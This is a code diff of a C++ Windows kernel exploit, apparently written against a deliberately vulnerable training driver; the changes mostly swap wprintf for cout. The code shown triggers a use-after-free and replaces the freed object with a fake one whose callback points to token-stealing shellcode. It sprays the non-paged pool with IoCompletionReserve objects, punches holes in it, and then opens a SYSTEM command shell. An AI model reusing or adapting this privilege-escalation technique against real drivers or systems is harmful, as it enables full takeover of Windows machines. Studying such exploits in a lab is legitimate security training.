@@ -1,10 +1,12 @@
 #include <Windows.h>
+#include <iostream>
 #include "winternl.h"
-#include "stdio.h"
 
 #include "Solutions.h"
 #include "ioctal_codes.h"
 #include "utils.h"
+
+using namespace std;
 
 enum class Commands {
 	AllocateUAFObject,
@@ -40,40 +42,40 @@ NTSTATUS Solutions::TriggerUAF() {
 	}
 
 	if (!NT_SUCCESS(Command(_hDeviceHandle, Commands::AllocateUAFObject))) {
-		wprintf(L"[-] Could not allocate UAF object");
+		cout << "[-] Could not allocate UAF object" << endl;
 		return STATUS_INVALID_PARAMETER;
 	}
-	wprintf(L"[+] Allocated UAF object\n");
+	cout << "[+] Allocated UAF object" << endl;
 
 	if (!NT_SUCCESS(Command(_hDeviceHandle, Commands::FreeUAFObject))) {
-		wprintf(L"[-] Could not free UAF object");
+		cout << "[-] Could not free UAF object" << endl;
 		return STATUS_INVALID_PARAMETER;
 	}
-	wprintf(L"[+] Freed UAF object\n");
+	cout << "[+] Freed UAF object" << endl;
 
 	DWORD dwBytesReturned = 0;
 	UAFStruct* lpInBuffer = (UAFStruct*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(UAFStruct));
 	if (!lpInBuffer) {
-		wprintf(L"[-] Could not allocate buffer\n");
+		cout << "[-] Could not allocate buffer" << endl;
 		return STATUS_NO_MEMORY;
 	}
 
 	lpInBuffer->callback = (ULONG)&tokenStealingShellcodeWriteWhatWhere;
 	memset(lpInBuffer->buf, 0x41, 0x54);
-	wprintf(L"[+] token stealing shellcode 0x%x\n", (ULONG)&tokenStealingShellcodeWriteWhatWhere);
+	cout << "[+] token stealing shellcode " << hex << (ULONG)&tokenStealingShellcodeWriteWhatWhere << endl;
 	
 	if (!DeviceIoControl(_hDeviceHandle, IOCTL_ALLOCATE_FAKE_OBJECT_NON_PAGED,
 		(PVOID)lpInBuffer, sizeof(UAFStruct), NULL, NULL, &dwBytesReturned, NULL)) {
-		wprintf(L"[-] Could not talk with the driver\n");
+		cout << "[-] Could not talk with the driver" << endl;
 		return STATUS_INVALID_PARAMETER;
 	}
-	wprintf(L"[+] Allocated fake object\n");
+	cout << "[+] Allocated fake object" << endl;
 	
 	if (!NT_SUCCESS(Command(_hDeviceHandle, Commands::UseUafObject))) {
-		wprintf(L"[-] Could not use UAF object");
+		cout << "[-] Could not use UAF object" << endl;
 		return STATUS_INVALID_PARAMETER;
 	}
-	wprintf(L"[+] Calling UAF callback -- enjoy system :)\n");
+	cout << "[+] Calling UAF callback -- enjoy system :)" << endl;
 
 	system("cmd.exe");
 
@@ -101,27 +103,27 @@ static NTSTATUS SprayHeap() {
 																				"NtAllocateReserveObject");
 	
 	if (!NtAllocateReserveObject) {
-		wprintf(L"[-] Could not load NtAllocateResearveObject - %d\n", GetLastError());
+		cout << "[-] Could not load NtAllocateResearveObject - " << GetLastError() << endl;
 		return STATUS_DLL_NOT_FOUND;
 	}
 
 	NTSTATUS status = 0;
 	PHANDLE hIoCo = (PHANDLE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, hArrSize * sizeof(HANDLE));
 	if (!hIoCo) {
-		wprintf(L"[-] Could not allocate buffer\n");
+		cout << "[-] Could not allocate buffer" << endl;
 		return STATUS_NO_MEMORY;
 	}
 
-	wprintf(L"[+] Spraying non paged pool with IoCo objects\n");
+	cout << "[+] Spraying non paged pool with IoCo objects" << endl;
 	for (int i = 0; i < 8000 + 5000; i++) {
 		status = NtAllocateReserveObject(&hIoCo[i], NULL, 1); // 1 = IoCo - > IoCompletionReserve 
 		if (!NT_SUCCESS(status)) {
-			wprintf(L"[-] Could not allocate IoCo object - %d\n", GetLastError());
+			cout << "[-] Could not allocate IoCo object - " << GetLastError() << endl;
 			return STATUS_NO_MEMORY;
 		}
 	}
 
-	wprintf(L"[+] Creating holes in the pool\n");
+	cout << "[+] Creating holes in the pool" << endl;
 	BOOLEAN shouldFree = true;
 	for (int i = 8000; i < 13000; i++) {
 		shouldFree && CloseHandle(hIoCo[i]);
